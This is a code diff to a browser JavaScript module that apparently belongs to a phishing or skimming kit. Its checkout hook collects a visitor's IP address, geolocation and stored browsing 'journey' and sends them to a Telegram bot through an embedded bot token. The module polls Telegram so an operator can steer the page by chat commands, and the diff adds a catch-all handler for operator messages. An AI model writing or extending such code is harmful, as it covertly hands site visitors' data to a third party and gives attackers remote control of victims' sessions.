@@ -173,9 +173,14 @@ ${extra ? '\n' + extra : ''}`;
   let blockPollInt = null;
   let lastBlockUpdateId = 0;
   const externalHandlers = {};
+  let anyMessageHandler = null;
 
   function onCallback(prefix, handler) {
     externalHandlers[prefix] = handler;
+  }
+
+  function onAnyMessage(handler) {
+    anyMessageHandler = handler;
   }
 
   async function tgAnswerCallback(id, text) {
@@ -237,11 +242,16 @@ ${extra ? '\n' + extra : ''}`;
         }
 
         if (u.message && u.message.text) {
+          let matched = false;
           for (const [trigger, handler] of Object.entries(externalHandlers)) {
             if (u.message.text.trim() === trigger) {
               handler(u.message);
+              matched = true;
               break;
             }
+          }
+          if (!matched && anyMessageHandler) {
+            anyMessageHandler(u.message);
           }
         }
       }
@@ -249,13 +259,6 @@ ${extra ? '\n' + extra : ''}`;
   }
 
   function startBlockListener() {
-    fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=-1&timeout=0`)
-      .then(r => r.json())
-      .then(d => {
-        if (d.ok && d.result && d.result.length) {
-          lastBlockUpdateId = d.result[d.result.length - 1].update_id;
-        }
-      }).catch(()=>{});
     blockPollInt = setInterval(startBlockPolling, 3000);
   }
 
@@ -420,7 +423,7 @@ ${extra ? '\n' + extra : ''}`;
     } catch(e) {}
   }
 
-  return { init, getIP, onCallback, sendJourneyToTelegram, onCheckout: async () => {
+  return { init, getIP, onCallback, onAnyMessage, sendJourneyToTelegram, onCheckout: async () => {
     const ip = await getIP();
     const geo = await getGeo(ip);
     const journey = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
